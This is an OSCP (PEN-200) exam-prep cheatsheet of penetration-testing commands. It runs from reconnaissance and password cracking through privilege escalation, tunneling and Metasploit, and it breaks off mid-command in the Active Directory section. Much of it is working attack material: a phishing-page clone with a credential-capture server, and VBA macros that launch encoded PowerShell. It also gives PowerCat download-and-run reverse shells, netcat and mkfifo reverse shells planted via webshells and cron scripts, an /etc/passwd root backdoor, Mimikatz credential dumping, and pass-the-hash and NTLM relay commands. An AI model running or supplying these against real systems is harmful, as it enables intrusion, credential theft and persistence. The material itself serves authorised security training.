# OSCP Command Cheatsheet — Consolidated Quick Reference

Master quick-reference extracted from PEN-200 chapters 6–27. Organized by topic for exam preparation.

---

## Chapter 6: Information Gathering

### Whois Enumeration
```bash
whois <domain> -h <whois-server>                    # Forward lookup — registrar DB
whois <IP> -h <whois-server>                        # Reverse lookup — IP owner
```

### Google Hacking (Dorks)
```
site:<domain> filetype:txt                          # File type search on domain
site:<domain> -filetype:html
site:<domain> intitle:"index of"                    # Directory listings
```

### DNS Enumeration — Linux
```bash
host www.<domain>                                   # A record
host -t mx <domain>                                 # MX records
host -t txt <domain>                                # TXT records
host <subdomain>.<domain>                           # NXDOMAIN check

for ip in $(cat list.txt); do host $ip.<domain>; done     # Subdomain brute-force
for ip in $(seq 64 79); do host 167.114.21.$ip; done | grep -Ev "not found|timed out"   # Reverse brute

dnsrecon -d <domain> -t std                         # Standard scan (NS/SOA/MX/TXT)
dnsrecon -d <domain> -D <wordlist> -t brt           # Wordlist brute-force
dnsenum <domain>                                    # Zone transfer + netrange sweep
```

### DNS Enumeration — Windows/LOLBAS
```powershell
nslookup mail.<domain>
nslookup -type=TXT <host> <dns-server>              # Query specific record type
```

### Port Scanning — Netcat (Basic)
```bash
nc -nvv -w 1 -z <IP> <startport>-<endport>         # TCP scan
nc -nv -u -z -w 1 <IP> <startport>-<endport>       # UDP scan
```

### Nmap Scanning
```bash
nmap <target>                                       # Top 1000 TCP ports
nmap -p 1-65535 <target>                            # All TCP ports
sudo nmap -sS <target>                              # SYN/stealth scan
sudo nmap -sT <target>                              # TCP connect scan
sudo nmap -sU <target>                              # UDP scan
sudo nmap -sU -sS <target>                          # Combined UDP + SYN

nmap -sn <IP-range>                                 # Ping sweep (host discovery)
nmap -PN <range>                                    # Skip discovery, treat as up
nmap -p 80 <IP-range> -oG web-sweep.txt
grep open web-sweep.txt | cut -d" " -f2             # Find web servers

nmap -sT -A --top-ports=20 <IP-range> -oG top-port-sweep.txt   # Fast sweep

sudo nmap -O --osscan-guess <target>                # OS fingerprinting
nmap -sV <target>                                   # Service/version detection
nmap -sT -A <target>                                # Full aggressive scan (OS/version/scripts/traceroute)

nmap --script http-headers <target>                 # Run NSE script
nmap --script-help http-headers
nmap -v -p 139,445 --script smb-os-discovery <target>
```

### Port Scanning — Windows/LOLBAS
```powershell
Test-NetConnection -Port 445 <IP>                  # Check single port

1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "TCP port $_ is open"} 2>$null
```

### SMB Enumeration
```bash
nmap -v -p 139,445 -oG smb.txt <IP-range>
sudo nbtscan -r <subnet>/24
nmap -v -p 139,445 --script smb-os-discovery <IP>
```

```cmd
net view \\<host> /all                              # List shares including hidden
```

### SMTP Enumeration
```bash
nc -nv <IP> 25
VRFY <user>                                         # Username validity check (252=likely valid, 550=unknown)
```

```powershell
Test-NetConnection -Port 25 <IP>
```

### SNMP Enumeration
```bash
sudo nmap -sU --open -p 161 <IP-range> -oG open-snmp.txt

echo public > community; echo private >> community; echo manager >> community
for ip in $(seq 1 254); do echo <subnet>.$ip; done > ips
onesixtyone -c community -i ips                     # Brute-force community strings

snmpwalk -c public -v1 -t 10 <IP>                   # Entire MIB tree
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25  # User accounts
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 # Running processes
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 # Installed software
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3   # Listening TCP ports
```

### Wordlist / DNS Brute-forcing (Gobuster)
```bash
gobuster dns -d <domain> -w <wordlist> -t 10       # Subdomain brute-force
```

---

## Chapter 7: Vulnerability Scanning

### Nessus Setup (Kali)
```bash
echo "<sha256>  Nessus-X.Y.Z-debian10_amd64.deb" > sha256sum_nessus
sha256sum -c sha256sum_nessus
sudo apt install ./Nessus-X.Y.Z-debian10_amd64.deb
sudo systemctl start nessusd.service
sudo systemctl status nessusd.service
```

### Nmap NSE — Vulnerability Scanning
```bash
cd /usr/share/nmap/scripts/
cat script.db | grep "\"vuln\""                     # List vuln-category scripts

sudo nmap -sV -p 443 --script "vuln" <target>      # Run all vuln scripts (needs -sV)
```

### Custom/Third-party NSE Scripts
```bash
sudo cp /home/kali/Downloads/<script>.nse /usr/share/nmap/scripts/<script>.nse
sudo nmap --script-updatedb
sudo nmap -sV -p 443 --script "<script-name>" <target>
```

---

## Chapter 8: Web Application Attacks — Introduction

### Web Server Fingerprinting
```bash
sudo nmap -p80 -sV <target>                         # Identify server software/version
sudo nmap -p80 --script=http-enum <target>          # Content discovery
```

### Directory/File Brute-forcing (Gobuster)
```bash
gobuster dir -u <target-url> -w /usr/share/wordlists/dirb/common.txt -t 5
gobuster dir -u <target-url> -w <wordlist> -p <pattern-file>   # Pattern mode
```

### Burp Suite Proxy Setup
```bash
burpsuite                                           # Launch Burp
# Firefox: Manual proxy → 127.0.0.1:8080 (all protocols)
```

### OSINT — Robots.txt / Sitemap
```bash
curl https://<target>/robots.txt
```

### API Enumeration (curl)
```bash
curl -i http://<target>:<port>/<endpoint>          # Inspect response + headers

curl -d '{"key":"value"}' -H 'Content-Type: application/json' http://<target>:<port>/<endpoint>

curl -X 'PUT' 'http://<target>:<port>/<endpoint>' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <token>' \
  -d '{"key":"value"}'
```

### XSS Payload Delivery
```bash
curl -A "<script>...</script>" --proxy 127.0.0.1:8080 http://<target>/
```

### XSS Probing
```
<>'"{};                                             # Special-character test
<script>alert(42)</script>                          # Basic XSS test
```

### JavaScript Testing (Firefox Console)
```javascript
function multiplyValues(x,y) { return x * y; }
let a = multiplyValues(3, 5)
console.log(a)
```

---

## Chapter 11: Phishing

### Website Cloning
```bash
mkdir ZoomSignin && cd ZoomSignin
wget -E -k -K -p -e robots=off -H -D<domain> -nd "<target_url>"

sudo python -m http.server 80                       # Serve cloned page

sudo apt install nodejs npm chromium -y
sudo npm install -g single-file-cli
single-file "<target_url>" signin.html --browser-executable-path /usr/bin/chromium
```

### Patching the Clone
```bash
grep -oP '.{0,100}Next</span>' signin.html

python3 << 'PYEOF'
import re
with open('signin.html','r') as f:
    html = f.read()
html = re.sub(r'<div id=onetrust-consent-sdk>.*?(?=<iframe)', '', html, flags=re.DOTALL)
html = html.replace('id=signin_btn_next', 'id=signin_btn_next onclick="goToPassword()"')
with open('signin.html','w') as f:
    f.write(html)
PYEOF
```

### Credential Capture Server
```bash
cat > cred_server.py << 'PYEOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        raw = self.rfile.read(length).decode()
        data = parse_qs(raw)
        # print/log data.get('email')/data.get('password')
        self.send_response(302)
        self.send_header('Location', '<real_login_url>')
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
PYEOF

python3 cred_server.py                              # Terminal 1
sudo python3 -m http.server 80                      # Terminal 2
cat credentials.txt                                 # Check captured creds
```

### LLM Pretext Generation
```text
Looking at the following email: "<sample sent email>"
Write another email in the same style as this, and include a reminder for employees to
login to <service>. Include a hyperlink that can be clicked and directs people to the
appropriate page.
```

---

## Chapter 12: Client-side Attacks

### Reconnaissance / OSINT
```bash
site:<domain> filetype:pdf                          # Google dork for documents
gobuster dir -u http://<target> -x pdf,doc,docx -w <wordlist>

exiftool -a -u <file>                               # Extract metadata (-a show duplicates, -u show unknown)
```

### Client Fingerprinting
```text
Canarytokens → Web bug / URL token → Create my Canarytoken
# Generates tracking link revealing browser/OS/IP
```

### RDP to Windows Lab
```bash
xfreerdp /v:<target_ip> /u:<user> /p:<password>    # Connect (supports NLA, unlike rdesktop)
```

### Office Macro Payload (VBA)
```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

### Long PowerShell Command via VBA Concatenation
```vb
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc <base64_chunk1>"
    Str = Str + "<base64_chunk2>"
    ...
    CreateObject("Wscript.Shell").Run Str
End Sub
```

### Split Long Base64 into VBA Lines
```python
str = "powershell.exe -nop -w hidden -enc <full_base64>"
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

### PowerCat Reverse Shell Payload
```text
IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');
powercat -c <kali_ip> -p 4444 -e powershell
```

```bash
python3 -m http.server 80                           # Serve powercat.ps1
nc -nvlp 4444                                       # Catch reverse shell
```

### Windows Library File (.Library-ms) Attack
```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

### Library XML with WebDAV Path
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation><url>http://<kali_ip></url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

### Shortcut Command on WebDAV
```text
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>:8000/powercat.ps1');
powercat -c <kali_ip> -p 4444 -e powershell"
```

### Deliver Library File via SMB
```bash
smbclient //<target_ip>/share -c 'put config.Library-ms'
```

---

## Chapter 13: Locating Public Exploits

### Google Search Operators
```bash
firefox --search "<product> site:exploit-db.com"    # Site-specific search
```

### SearchSploit Setup
```bash
sudo apt update && sudo apt install exploitdb
ls -1 /usr/share/exploitdb/
```

### SearchSploit Usage
```bash
searchsploit <term1> [term2] ... [termN]            # Basic keyword search

searchsploit afd windows local                      # Multi-term example
searchsploit -t oracle windows                      # Title-only search (-t)
searchsploit -p 39446                               # Show full path (-p)
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"    # Exclude results
searchsploit -s Apache Struts 2.0.0                 # Strict search (-s)
searchsploit -e "WordPress 4.1"                     # Exact match (-e)
searchsploit -j 55555 | json_pp                     # JSON output (-j)
searchsploit -w <term>                              # Show URLs (-w)
searchsploit --id <term>                            # Display EDB-ID
searchsploit --nmap <file.xml>                      # Cross-reference Nmap scan

searchsploit -m windows/remote/48537.py             # Mirror exploit (-m)
searchsploit -m 42031
```

### Nmap NSE Exploit Scripts
```bash
grep Exploits /usr/share/nmap/scripts/*.nse         # Find exploit scripts
nmap --script-help=<script>.nse                     # Get script info
nmap --script=<script>.nse <target>
```

### Full Exploitation Walkthrough (qdPM Example)
```bash
searchsploit -m 50944

python3 50944.py -url http://<target>/project/ -u <user> -p <password>

curl http://<target>/project/uploads/users/<file>-backdoor.php?cmd=whoami
curl http://<target>/project/uploads/users/<file>-backdoor.php --data-urlencode "cmd=which nc"

nc -lvnp 6666
curl http://<target>/project/uploads/users/<file>-backdoor.php --data-urlencode "cmd=nc <kali_ip> 6666 -e /bin/bash"
```

### msfvenom — Windows Reverse Shell Payload
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
```

---

## Chapter 14: Fixing Exploits

### Finding & Preparing Exploits
```bash
searchsploit "<app name and version>"
searchsploit -m exploits/<path>/<id>.c
```

### Cross-Compiling (Windows PE from Kali)
```bash
sudo apt install mingw-w64

i686-w64-mingw32-gcc <exploit>.c -o <output>.exe -lws2_32      # 32-bit
x86_64-w64-mingw32-gcc <file>.c -o <output>.exe                # 64-bit

sudo wine <output>.exe                                           # Test locally
```

### Disassembling Target DLLs
```bash
objdump -d <library>.dll                            # Find JMP ESP/return address
```

### Shellcode/Payload Generation
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread \
  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

### Listener
```bash
sudo nc -lvp 443                                    # Catch reverse shell
```

### Web Exploit Fixes (Python requests)
```python
base_url = "https://<target-ip>/<app-path>"

response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
```

### Verify Webshell
```bash
curl -k https://<target-ip>/uploads/shell.php?cmd=whoami   # -k ignores self-signed cert
```

---

## Chapter 16: Password Attacks

### Wordlist Prep
```bash
sudo gzip -d rockyou.txt.gz                         # Decompress Kali wordlist
```

### Hydra — SSH Single-User Dictionary Attack
```bash
hydra -l <username> -P <wordlist> -s <port> ssh://<target-ip>
```

### Hydra — RDP Password Spraying
```bash
hydra -L <userlist> -p "<single-password>" rdp://<target-ip>
```

### Hydra — HTTP POST Login Form
```bash
hydra -l <username> -P <wordlist> <target-ip> http-post-form \
  "/<path>:<field1>=^USER^&<field2>=^PASS^:<failure-string>"
```

### Hashcat Benchmarking
```bash
hashcat -b                                          # Benchmark rates
python3 -c "print(<charset_size>**<password_length>)"   # Keyspace math
```

### Manual Hash Check
```bash
echo -n "<candidate>" | sha256sum
```

### Hashcat Rule-Based Wordlist Mutation
```bash
hashcat -r <rule-file> --stdout <wordlist>         # Preview mutations

hashcat -m <mode> <hash-file> <wordlist> -r <rule-file> --force
```

### Hashcat Rule Functions
```
$X        # append character X
^X        # prepend character X
c         # capitalize first char, lowercase rest
```

### Hash Identification
```bash
hash-identifier
hashid <hash>
```

### Find Hashcat Mode
```bash
hashcat --help | grep -i "<algo name>"
hashcat -h | grep -i "<algo name>"
hashcat -hh | grep -i "<algo name>"
```

### KeePass Database Cracking
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 <hash-file> <wordlist> -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### SSH Private Key Passphrase Cracking
```bash
ssh -i id_rsa -p <port> <user>@<target-ip>
ssh2john id_rsa > ssh.hash
hashcat -m 22921 ssh.hash <wordlist> -r <rule-file> --force
```

### JtR Custom Rules
```bash
sudo sh -c 'cat <rule-file> >> /etc/john/john.conf'   # Append named rule
john --wordlist=<wordlist> --rules=<rulename> <hash-file>
john --show <hash-file>                             # Display cracked results
```

### Mimikatz — NTLM/SAM Dumping
```
privilege::debug
token::elevate
lsadump::sam
```

```bash
hashcat -m 1000 <hash-file> <wordlist> -r /usr/share/hashcat/rules/best66.rule --force
```

### Pass-the-Hash (PtH)
```bash
smbclient \\\\<target-ip>\\<share> -U <user> --pw-nt-hash <NTLM-hash>
impacket-psexec -hashes <LMhash>:<NTHash> <user>@<target-ip>        # Always SYSTEM
impacket-wmiexec -hashes <LMhash>:<NTHash> <user>@<target-ip>       # As authenticated user
```

### Net-NTLMv2 Capture (Responder)
```bash
sudo responder -I <interface>
dir \\<attacker-ip>\<share>                         # Force SMB auth attempt

hashcat -m 5600 <hash-file> <wordlist> --force     # Crack Net-NTLMv2
```

### Net-NTLMv2 Relaying
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target-ip> -c "<command>"
nc -nvlp 8080                                       # Catch reverse shell
```

### Credential Guard Bypass (Mimikatz)
```
privilege::debug
sekurlsa::logonpasswords                            # Dump creds (fails if Credential Guard enabled)
privilege::debug
misc::memssp                                        # Inject SSP to capture plaintext
type C:\Windows\System32\mimilsa.log                # Read captured creds
```

---

## Chapter 17: Windows Privilege Escalation

### Identity/Privileges
```cmd
whoami
whoami /groups
whoami /priv
```

### Users/Groups Enumeration
```powershell
Get-LocalUser
net user
net user <username>
Get-LocalGroup
Get-LocalGroupMember <groupname>
net localgroup administrators
```

### System/Network Info
```powershell
systeminfo
ipconfig /all
route print
netstat -ano
```

### Installed Apps/Processes
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process
```

### Hunt for Sensitive Files
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx,*.ext -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\<app-dir> -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### Reuse Discovered Credentials
```cmd
runas /user:<targetuser> cmd
```

### PowerShell Artifact Hunting
```powershell
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Public\Transcripts\<transcript>.txt
```

### Rebuild PSCredential from Leaked Creds
```powershell
$password = ConvertTo-SecureString "<plaintext>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<user>", $password)
Enter-PSSession -ComputerName <hostname> -Credential $cred
```

```bash
evil-winrm -i <target-ip> -u <user> -p "<password>"
```

### Automated Enumeration (winPEAS)
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

```powershell
iwr -uri http://<kali-ip>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

### Service Enumeration
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\path\to\service.exe"
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<svc>'}
```

### Service Binary Hijacking
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```powershell
iwr -uri http://<kali-ip>/adduser.exe -Outfile adduser.exe
move C:\path\to\original.exe original.exe.bak
move .\adduser.exe C:\path\to\service.exe
```

```cmd
shutdown /r /t 0                                    # Force reboot
```

```powershell
Get-LocalGroupMember administrators                # Verify new admin created
```

### PowerUp.ps1 — Service Binary Abuse
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<kali-ip>/PowerUp.ps1')
. .\PowerUp.ps1
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<service>'
```

### DLL Hijacking
```powershell
echo "test" > 'C:\App\test.txt'                    # Confirm write access
```

```bash
x86_64-w64-mingw32-gcc -shared -o TextShaping.dll TextShaping.c
```

```powershell
iwr -uri http://<kali-ip>/TextShaping.dll -OutFile 'C:\App\TextShaping.dll'
```

### Unquoted Service Paths
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell
Start-Service -Name '<service>'
Stop-Service -Name '<service>'
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\<subdir>"

iwr -uri http://<kali-ip>/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\<subdir>\Current.exe'
Start-Service <ServiceName>
```

### PowerUp.ps1 — Unquoted Service Path Abuse
```powershell
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name '<service>' -Path "C:\Program Files\<subdir>\Current.exe"
Restart-Service <service>
```

### Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask
icacls "C:\path\to\TaskBinary.exe"
iwr -Uri http://<kali-ip>/adduser.exe -Outfile TaskBinary.exe
move .\TaskBinary.exe TaskBinary.exe.bak
move .\adduser.exe .\TaskBinary.exe
```

### Kernel Exploits / Patch Enumeration
```powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

```cmd
whoami /priv
CVE-2023-29360.exe
whoami
```

### SeImpersonatePrivilege Abuse (Potato Tools)
```cmd
whoami /priv                                        # Confirm SeImpersonatePrivilege
```

```bash
wget https://github.com/<repo>/SigmaPotato/releases/download/<ver>/SigmaPotato.exe
python3 -m http.server 80
```

```powershell
iwr -uri http://<kali-ip>/SigmaPotato.exe -Outfile SigmaPotato.exe
.\SigmaPotato "net user <user> <pass> /add"
.\SigmaPotato "net localgroup Administrators <user> /add"
```

---

## Chapter 18: Linux Privilege Escalation

### User/System Enumeration
```bash
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
uname -a
```

### Process/Network Enumeration
```bash
ps aux
ip a
ifconfig
ip route
routel
route

ss -anp
cat /etc/iptables/rules.v4
```

### Cron Enumeration
```bash
ls -lah /etc/cron*
crontab -l
sudo crontab -l
grep "CRON" /var/log/syslog
```

### Package/Module/Filesystem Enumeration
```bash
dpkg -l
rpm -qa
find / -writable -type d 2>/dev/null

cat /etc/fstab
mount
lsblk

lsmod
/sbin/modinfo <module>
```

### SUID/Capability Discovery
```bash
find / -perm -u=s -type f 2>/dev/null               # SUID binaries
ps u -C <binary>
grep Uid /proc/<pid>/status
ls -asl <path>                                      # Check for 's' bit

/usr/sbin/getcap -r / 2>/dev/null                  # Capabilities
```

### Automated Enumeration
```bash
unix-privesc-check standard
unix-privesc-check detailed
./unix-privesc-check standard > output.txt
```

### Credential Hunting
```bash
env
cat .bashrc

su - root
crunch 6 6 -t Lab%%% > wordlist

hydra -l <user> -P wordlist -t 4 -V ssh://<target>

sudo -l
sudo -i

watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

### Cron Job Abuse
```bash
cat /home/<user>/.scripts/<script>.sh
ls -lah /home/<user>/.scripts/<script>.sh

echo >> <script>.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_IP> <port> >/tmp/f' >> <script>.sh
nc -lnvp <port>
```

### Passwd File Abuse
```bash
openssl passwd <password>
echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

### SUID Exploitation
```bash
find /home/<user>/Desktop -exec "/usr/bin/bash" -p \;    # -p preserves effective UID
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'   # cap_setuid+ep
```

### Sudo Abuse (GTFOBins)
```bash
sudo apt-get changelog apt
# in pager: !/bin/sh

aa-status
cat /var/log/syslog | grep <binary>
```

### Kernel Exploits
```bash
searchsploit "linux kernel <distro> Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"

mv <exploit>.c cve-XXXX-XXXXX.c
scp cve-XXXX-XXXXX.c <user>@<target>:
gcc cve-XXXX-XXXXX.c -o cve-XXXX-XXXXX
file cve-XXXX-XXXXX
./cve-XXXX-XXXXX
```

---

## Chapter 19: Port Redirection and SSH Tunneling

### Socat Port Forwarding
```bash
socat -ddd TCP-LISTEN:<port>,fork TCP:<dest_IP>:<dest_port>
echo 1 > /proc/sys/net/ipv4/conf/[interface]/forwarding    # Enable IP forwarding
```

### SSH Local Port Forwarding (-L)
```bash
ssh -N -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT user@SSH_SERVER
ss -ntplu                                           # Verify listener
```

### SSH Dynamic Port Forwarding (-D) + Proxychains
```bash
ssh -N -D 0.0.0.0:<port> user@SSH_SERVER

# /etc/proxychains4.conf: socks5 <SSH_client_IP> <port>
proxychains <tool> <args>
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n <target>
```

### SSH Remote Port Forwarding (-R)
```bash
ssh -N -R [BIND_IP:]BIND_PORT:DEST_IP:DEST_PORT user@ATTACKER_HOST
```

### SSH Remote Dynamic Port Forwarding (-R, OpenSSH 7.6+)
```bash
ssh -N -R <port> user@ATTACKER_HOST
```

### sshuttle (VPN-like tunnel)
```bash
sshuttle -r user@host:port <subnet1> <subnet2>
```

### Windows Native Tools
```cmd
ssh -N -R 9998 kali@<attacker_IP>

plink.exe -ssh -l <user> -pw <password> -R 127.0.0.1:<local_port>:127.0.0.1:<remote_port> <attacker_IP>
cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> ...

netsh interface portproxy add v4tov4 listenport=<port> listenaddress=<local_IP> connectport=<dest_port> connectaddress=<dest_IP>
netsh interface portproxy show all

netsh advfirewall firewall add rule name="<name>" protocol=TCP dir=in localip=<IP> localport=<port> action=allow
netsh advfirewall firewall delete rule name="<name>"
netsh interface portproxy del v4tov4 listenport=<port> listenaddress=<local_IP>

netstat -anp TCP | find "<port>"
```

---

## Chapter 20: Tunneling Through Deep Packet Inspection

### Chisel HTTP Tunneling — Setup
```bash
sudo cp $(which chisel) /var/www/html/
sudo systemctl start apache2
tail -f /var/log/apache2/access.log            # Confirm download
```

```bash
wget <kali_IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

### Chisel Server/Client
```bash
chisel server --port <port> --reverse

sudo tcpdump -nvvvXi <iface> tcp port <port>
```

```bash
/tmp/chisel client <kali_IP>:<port> R:socks > /dev/null 2>&1 &
/tmp/chisel client <kali_IP>:<port> R:socks &> /tmp/output; curl --data @/tmp/output http://<kali_IP>:<port>/
ss -ntplu                                           # Confirm SOCKS listening
```

### Pivoting SSH through Chisel SOCKS
```bash
sudo apt install ncat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:<socks_port> %h %p' user@<dest_IP>
```

### DNS Tunneling — Dnsmasq Authoritative Server
```bash
sudo dnsmasq -C dnsmasq.conf -d

resolvectl status
resolvectl flush-caches

nslookup <subdomain>.<domain>
nslookup <subdomain>.<domain> <specific_DNS_server>
sudo tcpdump -i <iface> udp port 53

nslookup -type=txt <name>.<domain>                 # Query TXT record for infiltration
```

### dnscat2 DNS Tunneling Framework
```bash
sudo dnscat2-server <domain>

./dnscat --secret=<secret> <domain>
./dnscat feline.corp

dnscat2> windows
dnscat2> window -i <id>

listen [<lhost>:]<lport> <rhost>:<rport>           # Local port forward
smbclient -p <local_port> -L //127.0.0.1 -U <user> --password=<password>
```

---

## Chapter 21: Metasploit Framework

### Setup and Database
```bash
sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole

db_status
workspace
workspace -a <name>
```

### Database-backed Recon
```
db_nmap -A <target>
hosts
services
services -p <port>
vulns
creds
```

### Module Search/Use
```
search type:auxiliary <keyword>
search <keyword/CVE>
use <module_path_or_index>

info
show options
show missing
set <OPTION> <value>
unset <OPTION>
run

services -p <port> --rhosts                         # Feed DB hosts to RHOSTS
```

### Auxiliary Example — SSH Brute Force
```
use auxiliary/scanner/ssh/ssh_login
set PASS_FILE <wordlist>
set USERNAME <user>
set RHOSTS <target>
set RPORT <port>
run
```

### Exploit Module Configuration
```
set payload <payload_path_or_index>
set SSL false
set RPORT <port>
set RHOSTS <target>
run
```

### Sessions and Jobs
```
sessions -l
sessions -i <id>
sessions -k <id>
run -j
jobs
```

### msfvenom — Standalone Payloads
```bash
msfvenom -l payloads --platform <windows|linux> --arch <x64|x86>
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <outfile>

nc -nvlp <port>                                     # Catch non-staged shell
```

### multi/handler — Staged/Meterpreter Payloads
```
use multi/handler
set payload <payload>
set LHOST <IP>
set LPORT <port>
run
```

### Meterpreter — Core
```
sysinfo
getuid
```

### Meterpreter — Channels
```
shell
channel -l
channel -i <id>
```

### Meterpreter — File System
```
pwd / lpwd
cd / lcd
ls / lls
download <remote_path>
upload <local_path> <remote_path>
cat <file>
lcat <file>
checksum <file>
```

### Meterpreter — Post-Exploitation
```
idletime

getsystem                                           # Automated privesc to SYSTEM
ps
migrate <PID>                                       # Migrate to another process
execute -H -f <program>                             # Hidden process

hashdump
screenshare
```

### UAC Bypass
```
search UAC
use exploit/windows/local/bypassuac_sdclt
set SESSION <id>
set LHOST <IP>
run
```

### Kiwi (Mimikatz) Extension
```
load kiwi
creds_msv / creds_all / creds_kerberos / creds_livessp / creds_ssp / creds_tspkg / creds_wdigest
dcsync / dcsync_ntlm
golden_ticket_create
kerberos_ticket_list / kerberos_ticket_purge / kerberos_ticket_use
kiwi_cmd <mimikatz_command>
lsa_dump_sam / lsa_dump_secrets
password_change
wifi_list / wifi_list_shared
```

### Pivoting
```
route add <subnet>/<cidr> <session_id>
route print
route flush

use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
set PORTS <ports>
run

use exploit/windows/smb/psexec
set SMBUser <user>
set SMBPass <password>
set RHOSTS <target>
set payload windows/x64/meterpreter/bind_tcp
set LPORT <port>
run
```

### Auto-Pivoting
```
use post/multi/manage/autoroute
set SESSION <id>
run
```

### SOCKS5 Proxy
```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j

sudo proxychains xfreerdp /v:<target> /u:<user>
```

### Port Forwarding (Meterpreter)
```
portfwd -h
portfwd add -l <local_port> -p <remote_port> -r <remote_host>

sudo xfreerdp /v:127.0.0.1 /u:<user>
```

### Resource Scripts
```bash
sudo msfconsole -r <script>.rc
```

### Example .rc Script
```
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <IP>
set LPORT <port>
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

---

## Chapter 22: Active Directory Introduction and Enumeration

### Initial Access
```bash
xfreerdp /u:<user> /d:<domain> /v:<IP>
```

### net.exe Enumeration
```cmd
net user /domain
net user <user> /domain
net group /domain
net group "<group_name>" /domain
```

### LDAP/ADSI via PowerShell
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

powershell -ep bypass

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
